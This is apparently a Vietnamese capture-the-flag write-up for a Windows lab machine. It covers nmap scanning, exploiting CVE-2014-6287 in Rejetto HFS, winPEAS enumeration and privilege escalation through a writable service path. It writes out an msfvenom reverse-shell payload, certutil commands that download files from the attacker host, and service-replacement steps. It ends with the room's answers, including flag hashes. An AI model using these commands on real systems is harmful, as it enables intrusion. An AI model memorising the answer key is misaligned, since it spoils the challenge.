![image](https://github.com/user-attachments/assets/496cf3dc-d253-47a7-a163-44d27b1ee3e1)

# Room info and Comment
## Room info
Sử dụng metasploit để truy cập lần đầu, sử dụng powershell để liệt kê leo thang đặc quyền của Windows và tìm hiểu kỹ thuật mới để có quyền truy cập Quản trị viên.

## Comment
Như tiêu đề, bài lâb này ban đầu hơi sai quy trình tí nên cách 1 làm hơi lâu =)). Bài lab này có 2 cách làm. Cách 1 sử dụng meterpreter cách 2 chạy bằng script có của CVE

# Analysis
## nmap
Scan để xem có những port và service gì
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -A -sC 10.10.29.130
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 15:00 EDT
Nmap scan report for 10.10.29.130
Host is up (0.21s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/8.5
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: STEELMOUNTAIN
|   NetBIOS_Domain_Name: STEELMOUNTAIN
|   NetBIOS_Computer_Name: STEELMOUNTAIN
|   DNS_Domain_Name: steelmountain
|   DNS_Computer_Name: steelmountain
|   Product_Version: 6.3.9600
|_  System_Time: 2024-07-30T19:02:09+00:00
|_ssl-date: 2024-07-30T19:02:14+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=steelmountain
| Not valid before: 2024-07-29T18:42:51
|_Not valid after:  2025-01-28T18:42:51
8080/tcp  open  http               HttpFileServer httpd 2.3
<snip>
```
Từ trên ta có port 8080 dùng service **HttpFileServer httpd 2.3**

## Search exploit 
Khi có thông tin trên dễ dàng tìm được [CVE](https://www.exploit-db.com/exploits/39161) của nó là `2014-6287`

![image](https://github.com/user-attachments/assets/d985fcaa-3e70-4f47-aa12-854c3df158f6)

## Exploit by script
Tải file pyton về và dựa vào note ta cần lưu ý 2 thứ:

- Máy mục tiêu phải được upload [file](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe) `nc.exe` để chạy và file nó được lấy **từ port 80 xuống**
- Có thể phải chạy **nhiều lần** mới thành công

![image](https://github.com/user-attachments/assets/1b530cee-2e25-45f8-95b0-6526e4a5f4c3)

Từ đây đã chiếm được quyền user, Tiếp theo là leo lên root

![image](https://github.com/user-attachments/assets/c2d71c0d-f4bc-4c94-ace0-6b69cf21119a)

## winpeax64.exe
Để check xem có thể leo quyền ở đâu ta sẽ dùng tool này.

Tuy nhiên cũng phải check xem nó đang chạy trên phiên bản nào bằng cách dùng command `systeminfo` để tải bản tương thích về --> `x64`

```
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>systeminfo
systeminfo

Host Name:                 STEELMOUNTAIN
OS Name:                   Microsoft Windows Server 2012 R2 Datacenter
OS Version:                6.3.9600 N/A Build 9600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00253-50000-00000-AA656
Original Install Date:     9/26/2019, 7:11:06 AM
System Boot Time:          7/30/2024, 11:41:57 AM
System Manufacturer:       Xen
System Model:              HVM domU
System Type:               x64-based PC
```
Để lấy file mình đã cầi sẵn ở đây
```
┌──(kali㉿kali)-[~/Downloads]
└─$ peass                      

> peass ~ Privilege Escalation Awesome Scripts SUITE

/usr/share/peass/
├── linpeas
│   ├── linpeas_darwin_amd64
│   ├── linpeas_darwin_arm64
│   ├── linpeas_fat.sh
│   ├── linpeas_linux_386
│   ├── linpeas_linux_amd64
│   ├── linpeas_linux_arm
│   ├── linpeas_linux_arm64
│   └── linpeas.sh
└── winpeas
    ├── winPEASany.exe
    ├── winPEASany_ofs.exe
    ├── winPEAS.bat
    ├── winPEASx64.exe
    ├── winPEASx64_ofs.exe
    ├── winPEASx86.exe
    └── winPEASx86_ofs.exe
```
Oke, tiếp theo sẽ upload file lên bằng lệnh sau:
```
certutil -urlcache -split -f http://10.8.202.137:80/winPEASx64.exe
```
Tiến hành chạy file
`.\winPEASx64.exe`

![image](https://github.com/user-attachments/assets/f9dc2d22-fdc7-4864-96bb-d9129440c72a)

Sau khi chạy ta sẽ thấy nó trả về 1 dòng đỏ về 1 service có tên là `AdvancedSystemCareService9` có thể tùy chỉnh tức là nếu ta sử dụng cách 1 tức là dùng metasploit bằng meterpreter ta nhìn thấy thuộc tính `CanRestart` là `true`,cho phép chúng ta khởi động lại một dịch vụ trên hệ thống, thư mục vào ứng dụng cũng có thể ghi được. Điều này có nghĩa là chúng t có thể thay thế ứng dụng hợp pháp bằng ứng dụng độc hại của mình, khởi động lại dịch vụ để chạy chương trình bị nhiễm của chúng ta!

![image](https://github.com/user-attachments/assets/b8058005-b7f4-40d2-861f-c165ef82b14e)
## msfvenom
Tiếp tục việc lợi dụng upload file lên với payload được lấy từ mfsvenom, và ta phải **upload file vào đúng path** trên để service này mới bị lợi dụng đúng cách
### Payload
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.202.137 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
### Upload file
```
C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd C:\Program Files (x86)\IObit 
cd C:\Program Files (x86)\IObit

C:\Program Files (x86)\IObit>certutil -urlcache -split -f http://10.8.202.137:80/Advanced.exe
certutil -urlcache -split -f http://10.8.202.137:80/Advanced.exe
****  Online  ****
  0000  ...
  3e00
CertUtil: -URLCache command completed successfully.
```
### Exploit
```
C:\Program Files (x86)\IObit>copy Advanced.exe "Advanced SystemCare"
copy Advanced.exe "Advanced SystemCare"
        1 file(s) copied.

C:\Program Files (x86)\IObit>sc stop AdvancedSystemCareService9
sc stop AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

C:\Program Files (x86)\IObit>sc start AdvancedSystemCareService9
sc start AdvancedSystemCareService9

SERVICE_NAME: AdvancedSystemCareService9 
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 2  START_PENDING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2532
        FLAGS              : 
```
Leo theo công!

![image](https://github.com/user-attachments/assets/dc6e9443-21e0-46f8-8a15-0bd1d470c325)

# Results
1. Who is the employee of the month? --> Bill Harper
2. Scan the machine with nmap. What is the other port running a web server on? --> 8080
3. Take a look at the other web server. What file server is running? --> Rejetto HTTP File Server
4. What is the CVE number to exploit this file server? --> 2014-6287
5. Use Metasploit to get an initial shell. What is the user flag? --> b04763b6fcf51fcd7c13abc7db4fd365
6. Take close attention to the CanRestart option that is set to true. What is the name of the service which shows up as an unquoted service path vulnerability? --> AdvancedSystemCareService9
7. What is the root flag? --> 9af5f314f57607c00fd09803a587db80
8. What powershell -c command could we run to manually find out the service name? *Format is "powershell -c "command here"* --> powershell -c "Get-Service"
